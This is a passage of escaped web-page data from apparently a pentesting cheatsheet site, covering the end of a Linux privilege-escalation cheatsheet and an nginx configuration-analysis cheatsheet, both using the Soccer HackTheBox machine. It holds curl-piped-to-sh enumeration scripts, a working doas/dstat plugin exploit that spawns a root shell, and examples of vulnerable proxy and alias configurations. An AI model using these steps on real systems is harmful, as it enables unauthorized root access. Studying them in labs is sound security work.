data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Download and run LinPEAS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Or transfer and run\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x linpeas.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./linpeas.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"linenum\"\u003eLinEnum\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Download LinEnum\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x LinEnum.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./LinEnum.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"lse-linux-smart-enumeration\"\u003eLSE (Linux Smart Enumeration)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Download and run LSE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x lse.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./lse.sh -l1  \u003cspan class=\"c1\"\u003e# Level 1 checks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./lse.sh -l2  \u003cspan class=\"c1\"\u003e# Level 2 checks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"real-world-example-soccer-htb-doasdstat\"\u003eReal-World Example: Soccer HTB doas/dstat\u003c/h2\u003e\n\u003ch3 id=\"initial-discovery\"\u003eInitial Discovery\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Found user can write to dstat plugin directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplayer@soccer:/usr/local/share$ find / -group player 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s1\"\u003e\u0026#39;^/proc\\|^/run\\|^/sys\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/share/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check doas configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplayer@soccer:~$ cat /usr/local/etc/doas.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epermit nopass player as root cmd /usr/bin/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check directory permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplayer@soccer:/usr/local/share$ ls -la\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edrwxrwx---  \u003cspan class=\"m\"\u003e2\u003c/span\u003e root player \u003cspan class=\"m\"\u003e4096\u003c/span\u003e Dec \u003cspan class=\"m\"\u003e12\u003c/span\u003e  \u003cspan class=\"m\"\u003e2022\u003c/span\u003e dstat\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"exploitation\"\u003eExploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create malicious dstat plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39;\u003c/span\u003e \u0026gt; /usr/local/share/dstat/dstat_exploit.py\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Execute with doas\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas /usr/bin/dstat --exploit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative method using GTFOBins reference\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p ~/.dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39;\u003c/span\u003e \u0026gt; ~/.dstat/dstat_exploit.py\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas /usr/bin/dstat --exploit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"prevention-and-hardening\"\u003ePrevention and Hardening\u003c/h2\u003e\n\u003ch3 id=\"secure-configuration-practices\"\u003eSecure Configuration Practices\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Proper doas configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use specific commands only, avoid wildcards\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epermit nopass user as root cmd /usr/bin/specific-binary arg1 arg2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Secure sudo configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Avoid NOPASSWD where possible\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use command aliases for complex commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Regularly audit sudo rules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# File permission hardening\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Remove world-writable permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -perm -002 -exec chmod o-w \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type f -perm -002 -exec chmod o-w \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"monitoring-and-detection\"\u003eMonitoring and Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Monitor privilege escalation attempts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauditctl -w /etc/passwd -p wa -k passwd_changes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauditctl -w /etc/shadow -p wa -k shadow_changes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauditctl -w /etc/sudoers -p wa -k sudo_changes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Log sudo/doas usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configure proper logging in /etc/sudoers or doas.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# File integrity monitoring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use tools like AIDE or Tripwire to monitor critical files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003e\u003cem\u003eAlways ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.\u003c/em\u003e\u003c/p\u003e","title":"Linux Privilege Escalation Cheatsheet"},{"content":"Nginx Configuration Analysis Cheatsheet Finding Nginx Configuration Files Common Configuration Locations # Main nginx configuration /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf # Site-specific configurations /etc/nginx/sites-available/ /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ # Default site configuration /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default # Additional includes /etc/nginx/snippets/ /etc/nginx/modules-enabled/ Finding Configuration Files # Locate nginx configuration find / -name \u0026#34;nginx.conf\u0026#34; 2\u0026gt;/dev/null find / -name \u0026#34;*.conf\u0026#34; -path \u0026#34;*nginx*\u0026#34; 2\u0026gt;/dev/null # Check nginx process for config location ps aux | grep nginx nginx -t # Test configuration and show file paths nginx -T # Dump configuration # Find all nginx-related files locate nginx.conf locate sites-available locate sites-enabled Main Configuration Analysis nginx.conf Structure # Global context user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; # Events context events { worker_connections 768; multi_accept on; use epoll; } # HTTP context http { # Basic settings sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; server_tokens off; # Security: Hide nginx version # MIME types include /etc/nginx/mime.types; default_type application/octet-stream; # Logging access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # Gzip compression gzip on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; # Include site configurations include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } Security-Relevant Directives # Check for security headers grep -r \u0026#34;server_tokens\u0026#34; /etc/nginx/ grep -r \u0026#34;add_header\u0026#34; /etc/nginx/ # Version disclosure grep -r \u0026#34;server_tokens\u0026#34; /etc/nginx/ # Should be: server_tokens off; # File upload limits grep -r \u0026#34;client_max_body_size\u0026#34; /etc/nginx/ # Request limits grep -r \u0026#34;limit_req\u0026#34; /etc/nginx/ grep -r \u0026#34;limit_conn\u0026#34; /etc/nginx/ Virtual Host Discovery Finding Virtual Hosts # List all site configurations ls -la /etc/nginx/sites-available/ ls -la /etc/nginx/sites-enabled/ # Extract server names from configurations grep -r \u0026#34;server_name\u0026#34; /etc/nginx/sites-available/ grep -r \u0026#34;server_name\u0026#34; /etc/nginx/sites-enabled/ # Check for wildcard or catch-all configurations grep -r \u0026#34;server_name.*\\*\u0026#34; /etc/nginx/ grep -r \u0026#34;default_server\u0026#34; /etc/nginx/ Virtual Host Configuration Analysis # Example virtual host configuration server { listen 80; listen [::]:80; # Primary domain and aliases server_name example.com www.example.com; # Document root root /var/www/html; index index.html index.htm index.php; # Locations location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; } } # Subdomain configuration server { listen 80; server_name subdomain.example.com; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Real-World Example: Soccer HTB # From Soccer HTB - Multiple virtual hosts found server { listen 80; listen [::]:80; server_name soccer.htb; root /var/www/html; index index.html index.htm index.nginx-debian.html; location / { try_files $uri $uri/ =404; } } # Additional virtual host discovered server { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Proxy Configuration Analysis Reverse Proxy Configurations # Basic reverse proxy location / { proxy_pass http://backend_server; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } # WebSocket proxy configuration location /websocket { proxy_pass http://localhost:9091; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_set_header Host $host; } # Load balancing upstream backend { server 192.168.1.10:8080; server 192.168.1.11:8080; server 192.168.1.12:8080; } location / { proxy_pass http://backend; } Proxy Security Issues # Check for missing security headers grep -r \u0026#34;proxy_set_header.*X-Forwarded\u0026#34; /etc/nginx/ grep -r \u0026#34;proxy_set_header.*Host\u0026#34; /etc/nginx/ # Check for proxy_pass misconfigurations grep -r \u0026#34;proxy_pass\u0026#34; /etc/nginx/ # Look for internal service exposure grep -r \u0026#34;proxy_pass.*127.0.0.1\\|localhost\u0026#34; /etc/nginx/ # Check for missing trailing slashes (path traversal) grep -r \u0026#34;proxy_pass.*[^/]$\u0026#34; /etc/nginx/ SSL/TLS Configuration Analysis SSL Configuration server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name example.com; # SSL certificates ssl_certificate /path/to/cert.pem; ssl_certificate_key /path/to/private.key; # SSL protocols and ciphers ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384; ssl_prefer_server_ciphers off; # SSL security headers add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; } SSL Security Checks # Check SSL configuration grep -r \u0026#34;ssl_\u0026#34; /etc/nginx/ # Check for weak SSL protocols grep -r \u0026#34;ssl_protocols\u0026#34; /etc/nginx/ # Should not include SSLv2, SSLv3, TLSv1, TLSv1.1 # Check SSL certificate paths grep -r \u0026#34;ssl_certificate\u0026#34; /etc/nginx/ # Check for HSTS headers grep -r \u0026#34;Strict-Transport-Security\u0026#34; /etc/nginx/ # Check for security headers grep -r \u0026#34;add_header\u0026#34; /etc/nginx/ Location Block Analysis Location Matching Patterns # Exact match location = /exact-path { return 200 \u0026#34;Exact match\u0026#34;; } # Prefix match location /prefix { # Matches /prefix, /prefix/, /prefix/anything } # Regular expression (case sensitive) location ~ \\.php$ { # Matches files ending with .php } # Regular expression (case insensitive) location ~* \\.(jpg|jpeg|png|gif)$ { # Matches image files (case insensitive) } # Prefix match with priority location ^~ /priority { # High priority prefix match } Security-Critical Locations # Check for admin/management interfaces grep -r \u0026#34;location.*admin\u0026#34; /etc/nginx/ grep -r \u0026#34;location.*management\u0026#34; /etc/nginx/ grep -r \u0026#34;location.*dashboard\u0026#34; /etc/nginx/ # Check for file upload locations grep -r \u0026#34;location.*upload\u0026#34; /etc/nginx/ grep -r \u0026#34;client_max_body_size\u0026#34; /etc/nginx/ # Check for API endpoints grep -r \u0026#34;location.*api\u0026#34; /etc/nginx/ grep -r \u0026#34;location.*/api\u0026#34; /etc/nginx/ # Check for hidden files/directories grep -r \u0026#34;location.*\\\\\\.\u0026#34; /etc/nginx/ Dangerous Location Configurations # Dangerous: Unrestricted file access location /files/ { alias /var/www/files/; # Can lead to path traversal } # Dangerous: PHP execution in upload directory location /uploads/ { location ~ \\.php$ { fastcgi_pass unix:/var/run/php/php7.4-fmp.sock; # Allows execution of uploaded PHP files } } # Dangerous: Proxy without validation location /proxy/ { proxy_pass $arg_url; # Open proxy vulnerability } Access Control Analysis Access Restrictions # IP-based access control location /admin { allow 192.168.1.0/24; allow 127.0.0.1; deny all; } # Authentication required location /protected { auth_basic \u0026#34;Protected Area\u0026#34;; auth_basic_user_file /etc/nginx/.htpasswd; } # Rate limiting limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s; location /login { limit_req zone=login burst=5 nodelay; } Access Control Issues # Check for missing access controls grep -r \u0026#34;allow\\|deny\u0026#34; /etc/nginx/ grep -r \u0026#34;auth_basic\u0026#34; /etc/nginx/ # Check for rate limiting grep -r \u0026#34;limit_req\u0026#34; /etc/nginx/ grep -r \u0026#34;limit_conn\u0026#34; /etc/nginx/ # Check for CORS configurations grep -r \u0026#34;add_header.*Access-Control\u0026#34; /etc/nginx/ File and Directory Analysis Document Root Analysis # Find document roots grep -r \u0026#34;root \u0026#34; /etc/nginx/sites-available/ grep -r \u0026#34;alias \u0026#34; /etc/nginx/sites-available/ # Check document root permissions ls -la /var/www/html/ ls -la /root/app/views/ # From Soccer HTB example # Look for sensitive files in document roots find /var/www/ -name \u0026#34;*.conf\u0026#34; -o -name \u0026#34;*.config\u0026#34; -o -name \u0026#34;*.bak\u0026#34; 2\u0026gt;/dev/null find /var/www/ -name \u0026#34;.env\u0026#34; -o -name \u0026#34;*.sql\u0026#34; -o -name \u0026#34;*.log\u0026#34; 2\u0026gt;/dev/null File Serving Configuration # Check autoindex settings grep -r \u0026#34;autoindex\u0026#34; /etc/nginx/ # Check for hidden file access grep -r \u0026#34;location.*\\\\\\.\u0026#34; /etc/nginx/ # Check MIME type configurations grep -r \u0026#34;mime.types\u0026#34; /etc/nginx/ grep -r \u0026#34;default_type\u0026#34; /etc/nginx/ Log Analysis Nginx Log Configuration # Access log format log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; error_log /var/log/nginx/error.log warn; # Custom log for specific location location /api/ { access_log /var/log/nginx/api.log; } Log File Analysis # Find nginx log files find /var/log -name \u0026#34;*nginx*\u0026#34; 2\u0026gt;/dev/null grep -r \u0026#34;access_log\\|error_log\u0026#34; /etc/nginx/ # Analyze access logs for reconnaissance tail -f /var/log/nginx/access.log grep \u0026#34;404\u0026#34; /var/log/nginx/access.log | head -20 grep \u0026#34;POST\u0026#34; /var/log/nginx/access.log | head -10 # Look for error patterns tail -f /var/log/nginx/error.log grep -i \u0026#34;error\\|fail\\|denied\u0026#34; /var/log/nginx/error.log Module and Extension Analysis Loaded Modules # Check compiled modules nginx -V 2\u0026gt;\u0026amp;1 | grep -o with-[a-z_]* nginx -V 2\u0026gt;\u0026amp;1 | grep -o without-[a-z_]* # Check dynamic modules ls -la /etc/nginx/modules-enabled/ ls -la /usr/lib/nginx/modules/ # Check module loading in config grep -r \u0026#34;load_module\u0026#34; /etc/nginx/ Security-Relevant Modules # Check for security modules nginx -V 2\u0026gt;\u0026amp;1 | grep -i \u0026#34;security\\|waf\\|firewall\u0026#34; # Check for authentication modules nginx -V 2\u0026gt;\u0026amp;1 | grep -i \u0026#34;auth\u0026#34; # Check for rate limiting modules nginx -V 2\u0026gt;\u0026amp;1 | grep -i \u0026#34;limit\u0026#34; # Check for SSL/TLS modules nginx -V 2\u0026gt;\u0026amp;1 | grep -i \u0026#34;ssl\\|tls\u0026#34; Configuration Testing and Validation Syntax Testing # Test nginx configuration syntax nginx -t nginx -T # Test and dump configuration # Test specific configuration file nginx -t -c /path/to/nginx.conf # Check configuration hierarchy nginx -T | grep -E \u0026#34;^#|server_name|listen|location\u0026#34; Runtime Analysis # Check running nginx processes ps aux | grep nginx # Check listening ports ss -tlnp | grep nginx netstat -tlnp | grep nginx # Check nginx status (if enabled) curl http://localhost/nginx_status Common Misconfigurations Path Traversal Issues # Vulnerable alias configuration location /files { alias /var/www/files/; # Missing trailing slash can cause path traversal } # Correct configuration location /files/ { alias /var/www/files/; } Information Disclosure # Version disclosure server_tokens on; # Should be off # Autoindex enabled location / { autoindex on; # May expose directory contents } # Error page information disclosure error_page 404 /404.html; # Should use custom error pages Proxy Misconfigurations # Open proxy vulnerability location /proxy { proxy_pass $arg_url; # Dangerous - allows arbitrary URLs } # SSRF via proxy_pass location ~ /proxy/(.+) { proxy_pass http://$1; # Can access internal services } Extraction Commands for Pentesting Quick Configuration Extraction # Extract all server names (virtual hosts) grep -r \u0026#34;server_name\u0026#34; /etc/nginx/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u # Extract all proxy_pass destinations grep -r \u0026#34;proxy_pass\u0026#34; /etc/nginx/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u # Extract all document roots grep -r \u0026#34;root \u0026#34; /etc/nginx/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u # Extract all listening ports grep -r \u0026#34;listen\u0026#34; /etc/nginx/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u One-liner Configuration Analysis # Complete nginx configuration dump find /etc/nginx -name \u0026#34;*.conf\u0026#34; -exec cat {} \\; 2\u0026gt;/dev/null # Extract virtual hosts with their configurations awk \u0026#39;/server_name/ {server=$2} /listen/ {port=$2} /root/ {docroot=$2} /}/ {print server, port, docroot; server=\u0026#34;\u0026#34;; port=\u0026#34;\u0026#34;; docroot=\u0026#34;\u0026#34;}\u0026#39; /etc/nginx/sites-enabled/* # Find potential security issues grep -r -E \u0026#34;(server_tokens on|autoindex on|proxy_pass \\$|allow all)\u0026#34; /etc/nginx/ Real-World Example: Soccer HTB Analysis Initial Discovery # Found nginx configuration in compromised system www-data@soccer:/etc/nginx/sites-enabled$ ls -la total 8 drwxr-xr-x 2 root root 4096 Nov 17 2022 . drwxr-xr-x 8 root root 4096 Nov 17 2022 .. lrwxrwxrwx 1 root root 34 Nov 17 2022 default -\u0026gt; /etc/nginx/sites-available/default lrwxrwxrwx 1 root root 41 Nov 17 2022 soc-player.htb -\u0026gt; /etc/nginx/sites-available/soc-player.htb Configuration Analysis # Extract virtual host information $ cat soc-player.htb server { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } Key Findings Additional virtual host discovered: soc-player.soccer.htb Internal service exposed: Application running on localhost:3000 WebSocket support: Configuration for WebSocket upgrades Document root: /root/app/views (unusual location) Automation Scripts Nginx Configuration Parser #!/bin/bash # nginx_analyzer.sh - Extract key information from nginx configs NGINX_PATH=\u0026#34;/etc/nginx\u0026#34; echo \u0026#34;=== Nginx Configuration Analysis ===\u0026#34; echo echo \u0026#34;Virtual Hosts:\u0026#34; grep -r \u0026#34;server_name\u0026#34; $NGINX_PATH/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $3}\u0026#39; | sort -u echo echo \u0026#34;Listening Ports:\u0026#34; grep -r \u0026#34;listen\u0026#34; $NGINX_PATH/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u | head -10 echo echo \u0026#34;Proxy Destinations:\u0026#34; grep -r \u0026#34;proxy_pass\u0026#34; $NGINX_PATH/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u echo echo \u0026#34;Document Roots:\u0026#34; grep -r \u0026#34;root \u0026#34; $NGINX_PATH/ | grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sort -u echo echo \u0026#34;Potential Security Issues:\u0026#34; grep -r -E \u0026#34;(server_tokens on|autoindex on|allow all)\u0026#34; $NGINX_PATH/ 2\u0026gt;/dev/null Security Recommendations Hardening Configuration # Security headers add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \u0026#34;1; mode=block\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34;; # Hide nginx version server_tokens off; # Rate limiting limit_req_zone $binary_remote_addr zone=global:10m rate=10r/s; limit_req zone=global burst=20 nodelay; # File upload restrictions client_max_body_size 10M; # Disable autoindex autoindex off; Monitoring and Logging # Enhanced logging format log_format detailed \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#39; \u0026#39;\u0026#34;$request\u0026#34; $status $body_bytes_sent \u0026#39; \u0026#39;\u0026#34;$http_referer\u0026#34; \u0026#34;$http_user_agent\u0026#34; \u0026#39; \u0026#39;$request_time $upstream_response_time\u0026#39;; # Log monitoring commands tail -f /var/log/nginx/access.log | grep -E \u0026#34;(4[0-9]{2}|5[0-9]{2})\u0026#34; awk \u0026#39;$9 ~ 